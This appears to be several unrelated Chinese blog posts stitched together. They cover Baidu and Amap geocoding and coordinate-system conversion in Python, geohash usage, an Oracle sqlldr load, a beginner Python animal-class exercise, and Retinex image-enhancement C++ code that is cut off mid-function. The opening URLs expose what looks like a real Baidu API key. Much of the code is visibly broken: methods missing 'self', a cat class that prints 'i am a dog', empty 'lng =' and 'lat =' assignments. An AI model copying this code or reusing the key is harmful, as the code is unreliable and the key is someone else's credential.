url new key：
http://api.map.baidu.com/geocoder?key=xpKTc80ZnEGiy1elZCMtEepEYKj5tqQr&output=json&address=
http://api.map.baidu.com/geocoder/v2/?address=&output=json&ak=xpKTc80ZnEGiy1elZCMtEepEYKj5tqQr
1.1.1 百度地图 python地理位置编码
请求样例：

http://api.map.baidu.com/geocoder/v2/?address=北京市海淀区上地十街10号&output=json&ak=您的ak&callback=showLocation //GET请求


import json
from urllib.request import urlopen, quote
import requests

def getlnglat(address):
    url = 'http://api.map.baidu.com/geocoder/v2/'
    output = 'json'
    ak = 'your ak'
    add = quote(address) #由于本文城市变量为中文，为防止乱码，先用quote进行编码
    uri = url + '?' + 'address=' + add  + '&output=' + output + '&ak=' + ak
    req = urlopen(uri)
    res = req.read().decode() #将其他编码的字符串解码成unicode
    result = json.loads(res) #对json数据进行解析
    lng=(result['result']['location']['lng'])
    lat=(result['result']['location']['lat']) 
    return result,lng,lat


1.1.2 百度地图 python逆地理位置编码

import urllib

def inverse_geocoding(url, headers, data=None):
    opener = urllib.request.build_opener()
    request = urllib.request.Request(url, data=data, headers=headers)
    response = opener.open(request, timeout=10)
#很奇怪的是为啥返回值前面会有renderReverse&&renderReverse
    result = response.read().decode('utf-8').replace('renderReverse&&renderReverse','').strip('(').strip(')')
    result_json = json.loads(result)

    return result_json


    # ak 需自行注册
ak = "your ak"
location = '34.265725,108.95346'
    
url = "http://api.map.baidu.com/geocoder/v2/?callback=renderReverse&location="+location +"&output=json&pois=1&ak={}".format(ak)
headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}
inverse_geocoding(url, headers)




返回值样例：这个坐标是西安钟楼的
{'result': {'addressComponent': {'adcode': '610103',
  'city': '西安市',
  'city_level': 2,
  'country': '中国',
  'country_code': 0,
  'country_code_iso': 'CHN',
  'country_code_iso2': 'CN',
  'direction': '北',
  'distance': '77',
  'district': '碑林区',
  'province': '陕西省',
  'street': '南大街',
  'street_number': '111号',
  'town': ''},
 'business': '钟楼,南院门,鼓楼',
 'cityCode': 233,
 'formatted_address': '陕西省西安市碑林区南大街111号',
 'location': {'lat': 34.265725030781496, 'lng': 108.95345999999995},
 'poiRegions': [{'direction_desc': '内',
   'distance': '0',
   'name': '钟楼',
   'tag': '旅游景点;风景区',
   'uid': '1bf85b2519cd8ea5a1a93414'}],
 'pois': [{'addr': '陕西省西安市莲湖区东大街和西大街交汇处',
   'cp': '',
   'direction': '内',
   'distance': '0',
   'name': '钟楼',
   'parent_poi': {'addr': '',
    'direction': '',
    'distance': '',
    'name': '',
    'point': {'x': 0.0, 'y': 0.0},
    'tag': '',
    'uid': ''},
   'poiType': '旅游景点',
   'point': {'x': 108.95345409800872, 'y': 34.26572409662325},
   'tag': '旅游景点;风景区',
   'tel': '',
   'uid': '1bf85b2519cd8ea5a1a93414',
   'zip': ''},
  {'addr': '西安西华门十字北大街宏府嘉会公寓A座13楼13051室',
   'cp': ' ',
   'direction': '附近',
   'distance': '18',
   'name': '西安钟楼驿站酒店公寓',
   'parent_poi': {'addr': '',
    'direction': '',
    'distance': '',
    'name': '',
    'point': {'x': 0.0, 'y': 0.0},
    'tag': '',
    'uid': ''},
   'poiType': '房地产',
   'point': {'x': 108.95342714884342, 'y': 34.265858348934465},
   'tag': '房地产;住宅区',
   'tel': '',
   'uid': '4ef5ddb21aed40545b109348',
   'zip': ''},
  {'addr': '北大街1号',
   'cp': ' ',
   'direction': '西南',
   'distance': '104',
   'name': '中国邮政储蓄银行(西安分行钟楼支行贷款营业部)',
   'parent_poi': {'addr': '西一路街道东大街619号',
    'direction': '西南',
    'distance': '144',
    'name': '西安市邮局钟楼支局办公楼',
    'point': {'x': 108.95446918323499, 'y': 34.266402814423635},
    'tag': '房地产;写字楼',
    'uid': 'b3786172fb784d2536b06c09'},
   'poiType': '金融',
   'point': {'x': 108.9542985051881, 'y': 34.2660746438698},
   'tag': '金融;银行',
   'tel': '',
   'uid': 'af0c814799ff1875d72ce2ea',
   'zip': ''},
  {'addr': '南大街110号',
   'cp': ' ',
   'direction': '东北',
   'distance': '188',
   'name': '钟楼饭店',
   'parent_poi': {'addr': '',
    'direction': '',
    'distance': '',
    'name': '',
    'point': {'x': 0.0, 'y': 0.0},
    'tag': '',
    'uid': ''},
   'poiType': '酒店',
   'point': {'x': 108.95234918223144, 'y': 34.26466498747333},
   'tag': '酒店;四星级',
   'tel': '',
   'uid': '0adce3e2c2e9387880a00c44',
   'zip': ''},
  {'addr': '西大街1号(钟楼西北角)',
   'cp': ' ',
   'direction': '南',
   'distance': '116',
   'name': '太平洋咖啡(钟楼店)',
   'parent_poi': {'addr': '',
    'direction': '',
    'distance': '',
    'name': '',
    'point': {'x': 0.0, 'y': 0.0},
    'tag': '',
    'uid': ''},
   'poiType': '美食',
   'point': {'x': 108.95326545385163, 'y': 34.26658181599918},
   'tag': '美食;咖啡厅',
   'tel': '',
   'uid': '7ccc1a1401313322bfa82251',
   'zip': ''},
  {'addr': '西一路街道东大街619号',
   'cp': ' ',
   'direction': '西南',
   'distance': '144',
   'name': '西安市邮局钟楼支局办公楼',
   'parent_poi': {'addr': '',
    'direction': '',
    'distance': '',
    'name': '',
    'point': {'x': 0.0, 'y': 0.0},
    'tag': '',
    'uid': ''},
   'poiType': '房地产',
   'point': {'x': 108.95446918323499, 'y': 34.266402814423635},
   'tag': '房地产;写字楼',
   'tel': '',
   'uid': 'b3786172fb784d2536b06c09',
   'zip': ''},
  {'addr': '新城区北大街1号',
   'cp': ' ',
   'direction': '西南',
   'distance': '137',
   'name': '中国邮政储蓄银行(钟楼支行)',
   'parent_poi': {'addr': '西一路街道东大街619号',
    'direction': '西南',
    'distance': '144',
    'name': '西安市邮局钟楼支局办公楼',
    'point': {'x': 108.95446918323499, 'y': 34.266402814423635},
    'tag': '房地产;写字楼',
    'uid': 'b3786172fb784d2536b06c09'},
   'poiType': '金融',
   'point': {'x': 108.9543973187942, 'y': 34.26638789760832},
   'tag': '金融;银行',
   'tel': '',
   'uid': '9eb487370346e799882fb584',
   'zip': ''},
  {'addr': '陕西省西安市莲湖区西大街27号西安世纪金花购物中心(钟楼店)1层',
   'cp': ' ',
   'direction': '东',
   'distance': '143',
   'name': '宜品生活(钟楼店)',
   'parent_poi': {'addr': '陕西省西安市莲湖区西大街1号',
    'direction': '东',
    'distance': '212',
    'name': '世纪金花(钟楼店)',
    'point': {'x': 108.95160358865816, 'y': 34.26608956074118},
    'tag': '购物;购物中心',
    'uid': '05e2027baf3cf7105910930f'},
   'poiType': '购物',
   'point': {'x': 108.95218748723966, 'y': 34.26587326584458},
   'tag': '购物;其他',
   'tel': '',
   'uid': '4370f9d2232f96cac51e51c3',
   'zip': ''},
  {'addr': '莲湖区西大街1号宜品超市附近',
   'cp': ' ',
   'direction': '东南',
   'distance': '152',
   'name': '星巴克(钟楼店)',
   'parent_poi': {'addr': '陕西省西安市莲湖区西大街1号',
    'direction': '东',
    'distance': '212',
    'name': '世纪金花(钟楼店)',
    'point': {'x': 108.95160358865816, 'y': 34.26608956074118},
    'tag': '购物;购物中心',
    'uid': '05e2027baf3cf7105910930f'},
   'poiType': '美食',
   'point': {'x': 108.95265460610484, 'y': 34.26664148310557},
   'tag': '美食;咖啡厅',
   'tel': '',
   'uid': '4eb3b5331af82e764302452f',
   'zip': ''},
  {'addr': '莲湖区西大街钟鼓楼广场社会路1号(德发长隔壁)',
   'cp': ' ',
   'direction': '东南',
   'distance': '225',
   'name': '锦江之星酒店(钟楼店)',
   'parent_poi': {'addr': '',
    'direction': '',
    'distance': '',
    'name': '',
    'point': {'x': 0.0, 'y': 0.0},
    'tag': '',
    'uid': ''},
   'poiType': '酒店',
   'point': {'x': 108.95195392780705, 'y': 34.26685031764148},
   'tag': '酒店;快捷酒店',
   'tel': '',
   'uid': '8fde79cc19ee3aa695ca0723',
   'zip': ''}],
 'roads': [],
 'sematic_description': '钟楼内'},
'status': 0}


细心的读者可能发现，百度地图的api 有两个版本的接口，一个旧版本一个新版本（对应链接中的v2）。对于旧版本的api 请求过程中发现，似乎正逆地里编码的准确度和成功率没有新版本的高，但是免费配额用光了后居然还可以继续使用

1.2 高德地图接口
高德地图坐标拾取
http://lbs.amap.com/console/show/picker
发送一个request请求，带上地理位置和api key 即可返回一个包含了经纬度str。
地理编码接口：
# -*- coding: utf-8 -*-
import requests
def geocode_change_key(address,key):
    parameters = {'address': address, 'key': key}
    base = 'http://restapi.amap.com/v3/geocode/geo'
    response = requests.get(base, parameters)
    answer = response.json()
    return str(answer['geocodes'][0]['location']).split(',')



2. 坐标系
谷歌地图采用的是WGS84地理坐标系（中国范围除外）
谷歌中国地图、搜搜中国地图、高德地图采用的是GCJ02地理坐标系
百度采用的是BD09坐标系。
而设备一般包含GPS芯片或者北斗芯片获取的经纬度为WGS84地理坐标系。
所以我们要根据得到的经纬度的坐标类型和地图厂商类型在地图上标点，否则会出现获取的位置误差。为什么不统一用WGS84地理坐标系这就是国家地理测绘总局对于出版地图的要求，出版地图必须符合GCJ02坐标系标准，也就是国家规定不能直接使用WGS84地理坐标系。
百度坐标系说明书：http://lbsyun.baidu.com/index.php?title=coordinate
2.1 我们常说的坐标系


WGS84：为一种大地坐标系，也是目前广泛使用的GPS全球卫星定位系统使用的坐标系。


GCJ02：又称火星坐标系，是由中国国家测绘局制定的地理坐标系统，是由WGS84加密后得到的坐标系。


BD09：为百度坐标系，在GCJ02坐标系基础上再次加密。其中bd09ll表示百度经纬度坐标，bd09mc表示百度墨卡托米制坐标。


2.2 坐标转码关键代码
# -*- coding: utf-8 -*-
import json
import urllib
import math

x_pi = 3.14159265358979324 * 3000.0 / 180.0
pi = 3.1415926535897932384626  # π
a = 6378245.0  # 长半轴
ee = 0.00669342162296594323  # 扁率



def gcj02_to_bd09(lng, lat):
    """
    火星坐标系(GCJ-02)转百度坐标系(BD-09)
    谷歌、高德——>百度
    :param lng:火星坐标经度
    :param lat:火星坐标纬度
    :return:
    """
    z = math.sqrt(lng * lng + lat * lat) + 0.00002 * math.sin(lat * x_pi)
    theta = math.atan2(lat, lng) + 0.000003 * math.cos(lng * x_pi)
    bd_lng = z * math.cos(theta) + 0.0065
    bd_lat = z * math.sin(theta) + 0.006
    return [bd_lng, bd_lat]


def bd09_to_gcj02(bd_lon, bd_lat):
    """
    百度坐标系(BD-09)转火星坐标系(GCJ-02)
    百度——>谷歌、高德
    :param bd_lat:百度坐标纬度
    :param bd_lon:百度坐标经度
    :return:转换后的坐标列表形式
    """
    x = bd_lon - 0.0065
    y = bd_lat - 0.006
    z = math.sqrt(x * x + y * y) - 0.00002 * math.sin(y * x_pi)
    theta = math.atan2(y, x) - 0.000003 * math.cos(x * x_pi)
    gg_lng = z * math.cos(theta)
    gg_lat = z * math.sin(theta)
    return [gg_lng, gg_lat]


def wgs84_to_gcj02(lng, lat):
    """
    WGS84转GCJ02(火星坐标系)
    :param lng:WGS84坐标系的经度
    :param lat:WGS84坐标系的纬度
    :return:
    """
    if out_of_china(lng, lat):  # 判断是否在国内
        return lng, lat
    dlat = _transformlat(lng - 105.0, lat - 35.0)
    dlng = _transformlng(lng - 105.0, lat - 35.0)
    radlat = lat / 180.0 * pi
    magic = math.sin(radlat)
    magic = 1 - ee * magic * magic
    sqrtmagic = math.sqrt(magic)
    dlat = (dlat * 180.0) / ((a * (1 - ee)) / (magic * sqrtmagic) * pi)
    dlng = (dlng * 180.0) / (a / sqrtmagic * math.cos(radlat) * pi)
    mglat = lat + dlat
    mglng = lng + dlng
    return [mglng, mglat]


def gcj02_to_wgs84(lng, lat):
    """
    GCJ02(火星坐标系)转GPS84
    :param lng:火星坐标系的经度
    :param lat:火星坐标系纬度
    :return:
    """
    if out_of_china(lng, lat):
        return lng, lat
    dlat = _transformlat(lng - 105.0, lat - 35.0)
    dlng = _transformlng(lng - 105.0, lat - 35.0)
    radlat = lat / 180.0 * pi
    magic = math.sin(radlat)
    magic = 1 - ee * magic * magic
    sqrtmagic = math.sqrt(magic)
    dlat = (dlat * 180.0) / ((a * (1 - ee)) / (magic * sqrtmagic) * pi)
    dlng = (dlng * 180.0) / (a / sqrtmagic * math.cos(radlat) * pi)
    mglat = lat + dlat
    mglng = lng + dlng
    return [lng * 2 - mglng, lat * 2 - mglat]


def bd09_to_wgs84(bd_lon, bd_lat):
    lon, lat = bd09_to_gcj02(bd_lon, bd_lat)
    return gcj02_to_wgs84(lon, lat)


def wgs84_to_bd09(lon, lat):
    lon, lat = wgs84_to_gcj02(lon, lat)
    return gcj02_to_bd09(lon, lat)


def _transformlat(lng, lat):
    ret = -100.0 + 2.0 * lng + 3.0 * lat + 0.2 * lat * lat + \
          0.1 * lng * lat + 0.2 * math.sqrt(math.fabs(lng))
    ret += (20.0 * math.sin(6.0 * lng * pi) + 20.0 *
            math.sin(2.0 * lng * pi)) * 2.0 / 3.0
    ret += (20.0 * math.sin(lat * pi) + 40.0 *
            math.sin(lat / 3.0 * pi)) * 2.0 / 3.0
    ret += (160.0 * math.sin(lat / 12.0 * pi) + 320 *
            math.sin(lat * pi / 30.0)) * 2.0 / 3.0
    return ret


def _transformlng(lng, lat):
    ret = 300.0 + lng + 2.0 * lat + 0.1 * lng * lng + \
          0.1 * lng * lat + 0.1 * math.sqrt(math.fabs(lng))
    ret += (20.0 * math.sin(6.0 * lng * pi) + 20.0 *
            math.sin(2.0 * lng * pi)) * 2.0 / 3.0
    ret += (20.0 * math.sin(lng * pi) + 40.0 *
            math.sin(lng / 3.0 * pi)) * 2.0 / 3.0
    ret += (150.0 * math.sin(lng / 12.0 * pi) + 300.0 *
            math.sin(lng / 30.0 * pi)) * 2.0 / 3.0
    return ret


def out_of_china(lng, lat):
    """
    判断是否在国内，不在国内不做偏移
    :param lng:
    :param lat:
    :return:
    """
    return not (lng > 73.66 and lng < 135.05 and lat > 3.86 and lat < 53.55)


if __name__ == '__main__':
  
    lng = 
    lat = 
    # result1 = gcj02_to_bd09(lng, lat)
    # result2 = bd09_to_gcj02(lng, lat)
    # result3 = wgs84_to_gcj02(lng, lat)
    result4 = gcj02_to_wgs84(lng, lat)
    #result5 = bd09_to_wgs84(lng, lat)
    #result6 = wgs84_to_bd09(lng, lat)

    print (result4)



3. geohash
https://www.cnblogs.com/LBSer/p/3310455.html
当geohash base32编码长度为8时，精度在19米左右，而当编码长度为9时，精度在2米左右，所以一般来说用八位就够用。


3.1 python3 使用 geohash
python3如何使用geohash呢，网上说使用pip install geohash后import geohash 会报错，当然同样的作者提供了geohash包的fix版geohash2，所以安装时候应该是：(改源码的方式有点太高大上，不太安全？)
pip install geohash2

github：https://github.com/dbarthe/geohash/
我很纳闷的是python中能够生成geohash 的包实在是太多了：



3.2 获取包围盒
可以看到7位geohash编码带上一个包围盒，相对于6位geohash编码准确许多


简单写了一个类，使用geohash2（作者居然没有提供），我只好复制了mzgeohash的部分代码
https://gitee.com/wangyaning/python/tree/master/geohash
可以直接这么用：
#e.g
import geohash2
print ('Geohash for 42.6, -5.6:', geohash2.encode(42.6, -5.6))
#Geohash for 42.6, -5.6: ezs42e44yx96
print ('Geohash for 42.6, -5.6:', geohash2.encode(42.6, -5.6, precision=5))
#Geohash for 42.6, -5.6: ezs42
print ('Coordinate for Geohash ezs42:', geohash2.decode('ezs42'))
#Coordinate for Geohash ezs42: ('42.6', '-5.6')



if __name__=='__main__':
    myTestGeohash = MyGeohash()
    #wx4g340
    print(myTestGeohash.getneighbors('wx4g340'))


#输出如下：    
{'ne': 'wx4g343', 'n': 'wx4g342', 'w': 'wx4g2fp', 'c': 'wx4g340', 'sw': 'wx4g2cz', 'se': 'wx4g31c', 'nw': 'wx4g2fr', 'e': 'wx4g341', 's': 'wx4g31b'}



4.测试geohash查询接口
https://cevin.net/geohash/（已经失效）
上述网址已经失效，可以使用 http://geohash.org/ 测试


5.结构化数据的处理入库
爬好数据的后处理，入库
新学了sqlldr命令，挺快，连python代码都不用写了
sqlldr userid='username/password@serverip/instance' control=./xxx.ctl errors=99999999 rows=20000 direct=true
data=xxxxxxx.txt

xxx.ctl文件如下

LOAD DATA
CHARACTERSET 'UTF8'
INFILE *
APPEND INTO TABLE TABLENAME
FIELDS TERMINATED BY ','
OPTIONALLY ENCLOSED BY '"&*!'
trailing nullcols
(
linename ,
xxxxxx,
xxxxxx
)



部分参考文献
简单的城市名转换成经纬度：
https://www.cnblogs.com/zle1992/p/7209932.html
批量获取经纬度：
https://www.cnblogs.com/reboot777/p/7124010.html
用Python计算北京地铁的两站间最短换乘路线：
http://blog.csdn.net/myjiayan/article/details/45954679
使用爬虫获取获取所有的 站点名
http://blog.csdn.net/wenwu_both/article/details/70168760
高德地图地理编码服务
http://blog.csdn.net/u013250416/article/details/71178156
https://www.cnblogs.com/xautxuqiang/p/6241561.html








就是几个动物，自动排列生成什么的

class Animal(object):
	def __init__(self,name,weight):
		self.name = name
		self.weight = weight
	def eat(self):
		self.weight +=1
	def speak(self):
		print ("i am a animal")
	def walk(self):
		print ("i am walking")	
	
class Dog(Animal):
	def __init__(self,name,weight):
		Animal.__init__(self,name,weight)
	def eat():
		self.weight +=1
	def speak(self):
		print ("i am a dog")
	def walk(self):
		print ("i am walking")	
class Duck(Animal):
	def __init__(self,name,weight):
		Animal.__init__(self,name,weight)
	def eat(self):
		self.weight +=1
	def speak(self):
		print ("i am a duck")
	def walk(self):
		print ("i am walking")	
class Cat(Animal):
	def __init__(self,name,weight):
		Animal.__init__(self,name,weight)
	def eat(self):
		self.weight +=1
	def speak(self):
		print ("i am a dog")
	def walk():
		print ("i am walking")	



#animal = Dog("Dog",24)

#animal.speak()

def reAnimals(zoo):
	
	string = "animal"
	for x in range(0,21):
		if x%3 ==0:
			animal = Dog(string+str(x),x+2)
		if x%3 ==1:
			animal = Duck(string+str(x),x)		
		if x%3 ==2:
			animal = Cat(string+str(x),x)
		zoo.append(animal)
	return zoo


#zoo = [item for item in animal if item.weight <= 10 and item.weight >= 0]

def filterAnimal(animal):
	zoo = []
	for x in range(0,len(animal)):
		if animal[x].weight<=10 and animal[x].weight>=0:
			zoo.append(animal[x])
	#animal.clear()
	#animal = zoo
	return zoo

animal = []
dongwu = []

dongwu = filterAnimal(reAnimals(dongwu))

for x in dongwu:
	x.speak()
	print (x.weight)



#print (animal[x].weight)


		



改版代码：

class Animal(object):
	def __init__(self,name,weight):
		self.name = name
		self.weight = weight
	def eat(self):
		self.weight +=1
	def fly(self):
		print ("i am a animal and i can fly")
	def jump(self):
		print ("i can jump ")	
	
class Tiger(Animal):
	def __init__(self,name,weight):
		Animal.__init__(self,name,weight)
	def eat():
		self.weight +=1
	def fly(self):
		print ("i am a Tiger and i cant fly")
	def jump(self):
		print ("i can jump ")		
class Bird(Animal):
	def __init__(self,name,weight):
		Animal.__init__(self,name,weight)
	def eat(self):
		self.weight +=1
	def fly(self):
		print ("i am a bird and i can fly")
	def jump(self):
		print ("i can jump ")	
class Snake(Animal):
	def __init__(self,name,weight):
		Animal.__init__(self,name,weight)
	def eat(self):
		self.weight +=1
	def fly(self):
		print ("i am a snake and i cant fly")
	def jump(self):
		print ("i cant jump ")	
        
container = []
dongwu = []

class Zoo(object):
    def filterAnimal(animal):
        container = []
        for x in range(0,len(animal)):
            if animal[x].weight<=10 and animal[x].weight>=0:
                container.append(animal[x])
        return container
    def reAnimals(container):
        string = "animal"   
        for x in range(0,21):
            if x%3 ==0:
                animal = Tiger(string+str(x),x+2)
            if x%3 ==1:
                animal = Bird(string+str(x),x)		
            if x%3 ==2:
                animal = Snake(string+str(x),x)
            container.append(animal)
        return container	
    def relax():
        dongwu = Zoo.filterAnimal(Zoo.reAnimals(container))
        for x in dongwu:
            x.fly()
            x.jump()
            

Zoo.relax()


		












 
 
http://www.cnblogs.com/sleepwalker/p/3676600.html?utm_source=tuicool
http://blog.csdn.net/carson2005/article/details/9502053
 
 
Retinex理论
Retinex理论始于Land和McCann于20世纪60年代作出的一系列贡献,其基本思想是人感知到某点的颜色和亮度并不仅仅取决于该点进入人眼的绝对光线，还和其周围的颜色和亮度有关。Retinex这个词是由视网膜(Retina)和大脑皮层(Cortex)两个词组合构成的.Land之所以设计这个词，是为了表明他不清楚视觉系统的特性究竟取决于此两个生理结构中的哪一个，抑或是与两者都有关系。
Land的Retinex模型是建立在以下的基础之上的：
一、真实世界是无颜色的，我们所感知的颜色是光与物质的相互作用的结果。我们见到的水是无色的，但是水膜—肥皂膜却是显现五彩缤纷，那是薄膜表面光干涉的结果；
二、每一颜色区域由给定波长的红、绿、蓝三原色构成的；
三、三原色决定了每个单位区域的颜色。
Retinex 理论的基本内容是物体的颜色是由物体对长波（红）、中波（绿）和短波（蓝）光线的反射能力决定的，而不是由反射光强度的绝对值决定的；物体的色彩不受光照非均性的影响，具有一致性，即Retinex理论是以色感一致性（颜色恒常性）为基础的。如下图所示，观察者所看到的物体的图像S是由物体表面对入射光L反射得到的，反射率R由物体本身决定，不受入射光L变化。
 
 
本来想把下面的代码改成opencv版本的，但是不太会把读出来的mat里面数据改成BYTE*里面，在主函数里面写的一点都注释了
 
 
// Retinex.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <cmath>
#include <time.h>
#include <iostream>

#include "opencv2/core/core.hpp"
#include "opencv2/highgui/highgui.hpp"
#include "opencv2/imgproc/imgproc.hpp"

#pragma comment(lib,"opencv_core2410d.lib")                  
#pragma comment(lib,"opencv_highgui2410d.lib")                  
#pragma comment(lib,"opencv_imgproc2410d.lib")  


using namespace std; 
using namespace cv;

#define EPSILON 1
#define DELTA 1
#define GAMMA 0.9	
#define PI 3.1415926
#define ALPHA_c 1

//////////////////////////
//  Read a 8 bit bmp File
//////////////////////////
BYTE *Read8BitBmpFile2Img(const char * filename,int *width,int *height)
{   FILE * BinFile;
BITMAPFILEHEADER FileHeader;
BITMAPINFOHEADER BmpHeader;
BYTE *img;
int size;
int Suc=1;
// Open File
*width=*height=0;
if((BinFile=fopen(filename,"rb"))==NULL) return NULL;
// Read Struct Info
if (fread((void *)&FileHeader,1,sizeof(FileHeader),BinFile)!=sizeof(FileHeader)) Suc=-1;
if (fread((void *)&BmpHeader,1,sizeof(BmpHeader),BinFile)!=sizeof(BmpHeader)) Suc=-1;
if (Suc==-1) { fclose(BinFile); return NULL; }
// Read Image Data
*width=(BmpHeader.biWidth+3)/4*4;
*height=BmpHeader.biHeight;
size=(BmpHeader.biWidth+3)/4*4*BmpHeader.biHeight;
fseek(BinFile,FileHeader.bfOffBits,SEEK_SET);
if ( (img=new BYTE[size+8])!=NULL)
{   if(fread(img+8-int(img)%8,sizeof(BYTE),size,BinFile)!=(unsigned int)size)
{ fclose(BinFile);
delete img;
img=NULL;
return NULL;
}
}
fclose(BinFile);
return img;
}

/////////////////////////
// Write a 8 bit bmp File
/////////////////////////
int Write8BitImg2BmpFile(BYTE *img,int width,int height,const char * filename)
{   FILE * BinFile;
BITMAPFILEHEADER FileHeader;
BITMAPINFOHEADER BmpHeader;
BYTE p[4];
int i,Suc=1;

// Open File
if((BinFile=fopen(filename,"w+b"))==NULL) {  return -1; }
//  Fill the FileHeade)
FileHeader.bfType= ((WORD) ('M' << 8) | 'B');
FileHeader.bfOffBits=sizeof(BITMAPFILEHEADER)+sizeof(BmpHeader)+256*4L;
FileHeader.bfSize=FileHeader.bfOffBits+width*height ;
FileHeader.bfReserved1=0;
FileHeader.bfReserved2=0;
if (fwrite((void *)&FileHeader,1,sizeof(FileHeader),BinFile)!=sizeof(FileHeader)) Suc=-1;
// Fill the ImgHeader
BmpHeader.biSize = 40;
BmpHeader.biWidth = width;
BmpHeader.biHeight = height;
BmpHeader.biPlanes = 1 ;
BmpHeader.biBitCount = 8 ;
BmpHeader.biCompression = 0 ;
BmpHeader.biSizeImage = 0 ;
BmpHeader.biXPelsPerMeter = 0;
BmpHeader.biYPelsPerMeter = 0;
BmpHeader.biClrUsed = 0;
BmpHeader.biClrImportant = 0;
if (fwrite((void *)&BmpHeader,1,sizeof(BmpHeader),BinFile)!=sizeof(BmpHeader)) Suc=-1;
// write Pallete
for (i=0,p[3]=0;i<256;i++) 
{  
	p[3]=0;
	p[0]=p[1]=p[2]=i; // blue,green,red;
	if (fwrite((void *)p,1,4,BinFile)!=4) { Suc=-1; break; }
}
// write image data
if (fwrite((void *)img,1,width*height,BinFile)!=(unsigned int) width*height) Suc=-1;
// return;
fclose(BinFile);
return Suc;
}

//////////////////////////
//  Read a 24 bit bmp File
//////////////////////////
BYTE *Read24BitBmpFile2Img(const char * filename,int *width,int *height)
{  
	FILE * BinFile;
	BITMAPFILEHEADER FileHeader;
	BITMAPINFOHEADER BmpHeader;
	BYTE *img;
	int size;
	int Suc=1;

	// Open File
	*width=*height=0;
	if((BinFile=fopen(filename,"rb"))==NULL) return NULL;
	// Read Struct Info
	if (fread((void *)&FileHeader,1,sizeof(FileHeader),BinFile)!=sizeof(FileHeader)) Suc=-1;
	if (fread((void *)&BmpHeader,1,sizeof(BmpHeader),BinFile)!=sizeof(BmpHeader)) Suc=-1;
	if (Suc==-1) { fclose(BinFile); return NULL; }
	// Read Image Data
	*width=(BmpHeader.biWidth+3)/4*4;
	*height=BmpHeader.biHeight;
	size=(*width)*(*height)*3;
	fseek(BinFile,FileHeader.bfOffBits,SEEK_SET);
	if ( (img=new BYTE[size+8])!=NULL)
	{   
		if(fread(img+8-int(img)%8,sizeof(BYTE),size,BinFile)!=(unsigned int)size)
		{ 
			fclose(BinFile);
			delete img;
			img=NULL;
			return NULL;
		}
	}
	fclose(BinFile);
	return img;
}
//////////////////////////
//  write a 24 bit bmp File
//////////////////////////
bool Write24BitImg2BmpFile(BYTE *img,int width,int height,const char * filename)
{   
	FILE * BinFile;
	BITMAPFILEHEADER FileHeader;
	BITMAPINFOHEADER BmpHeader;
	bool Suc=true;
	int y,i,extend;
	BYTE *pCur;

	// Open File
	if((BinFile=fopen(filename,"w+b"))==NULL) {  return false; }
	// Fill the FileHeader
	FileHeader.bfType= ((WORD) ('M' << 8) | 'B');
	FileHeader.bfOffBits=sizeof(BITMAPFILEHEADER)+sizeof(BmpHeader);
	FileHeader.bfSize=FileHeader.bfOffBits+width*height*3L ;
	FileHeader.bfReserved1=0;
	FileHeader.bfReserved2=0;
	if (fwrite((void *)&FileHeader,1,sizeof(FileHeader),BinFile)!=sizeof(FileHeader)) Suc=false;
	// Fill the ImgHeader
	BmpHeader.biSize = 40;
	BmpHeader.biWidth = width;
	BmpHeader.biHeight = height;
	BmpHeader.biPlanes = 1 ;
	BmpHeader.biBitCount = 24 ;
	BmpHeader.biCompression = 0 ;
	BmpHeader.biSizeImage = 0 ;
	BmpHeader.biXPelsPerMeter = 0;
	BmpHeader.biYPelsPerMeter = 0;
	BmpHeader.biClrUsed = 0;
	BmpHeader.biClrImportant = 0;
	if (fwrite((void *)&BmpHeader,1,sizeof(BmpHeader),BinFile)!=sizeof(BmpHeader)) Suc=false;
	// write image data
	extend=(width+3)/4*4-width;
	if (extend==0)
	{   
		if (fwrite((void *)img,1,width*height*3,BinFile)!=(unsigned int)3*width*height) Suc=false;
	}
	else
	{   
		for(y=0,pCur=img;y<height;y++,pCur+=3*width)
		{   
			if (fwrite((void *)pCur,1,width*3,BinFile)!=(unsigned int)3*width) Suc=false; // 真实的数据
			for(i=0;i<extend;i++) // 扩充的数据
			{ 
				if (fwrite((void *)(pCur+3*(width-1)+0),1,1,BinFile)!=1) Suc=false;
				if (fwrite((void *)(pCur+3*(width-1)+1),1,1,BinFile)!=1) Suc=false;
				if (fwrite((void *)(pCur+3*(width-1)+2),1,1,BinFile)!=1) Suc=false;
			}
		}
	}
	// return;
	fclose(BinFile);
	return Suc;
}

//////////////////////////
// Logarithm Transform
// OrgImg: point to original image
// widht: the width of the image
// height:the height of the image
// LogImg: point to logarithm transform  of the image
//////////////////////////
void LogarithmTransform(int *OrgImg,int width,int height,int *LogImg)
{
	int *pLog=LogImg,*pCur=OrgImg;
	int i,size,temp;
	size=width*height;
	for(i=0;i<size;i++)
	{
		temp=*pCur++;
		if(temp==0) *pLog++=0;
		else *pLog++=log(float(temp))*2048;
	}
	return;
}
////////////////////////////////
//  计算窗口内像素灰度和
////////////////////////////////
void Ini(BYTE *pOrgImg,int width,int height,int *sum)
{
	int i,j;
	BYTE *pCur;
	pCur=pOrgImg;
	*sum=*pCur;
	for(i=1;i<height;i++)
		*(sum+i*width)=*(sum+(i-1)*width)+*(pCur+i*width);
	for(j=1;j<width;j++)
		*(sum+j)=*(sum+j-1)+*(pCur+j);
	for(i=1;i<height;i++)
	{
		for(j=1;j<width;j++) 
		{
			*(sum+i*width+j)=*(sum+(i-1)*width+j)+*(sum+i*width+j-1)-*(sum+(i-1)*width+j-1)+*(pCur+i*width+j); //卷积计算
		}
	}
	return;
}

//////////////////////////
// 局部非线性对比度增强
//////////////////////////
void LocalNonlinearStretch(BYTE *OrgImg,int width,int height,int *ResData)
{
	int i,j,k,s,size=width*height;
	int *pData,*sum,sum1;
	double avg,min,max,nor;
	BYTE *pCur=OrgImg;
	sum=new int[width*height];
	pData=ResData+width+1;
	//	Ini(OrgImg,width,height,sum);
	for(i=0;i<height-2;i++,pCur+=2,pData+=2)
	{
		min=*pCur;
		max=*pCur;
		for(k=0;k<3;k++)
		{
			for(s=0;s<3;s++)
			{
				if(*(pCur+k*width+s)<min) min=*(pCur+k*width+s);
				else if(*(pCur+k*width+s)>max) max=*(pCur+k*width+s);
			}
		}	
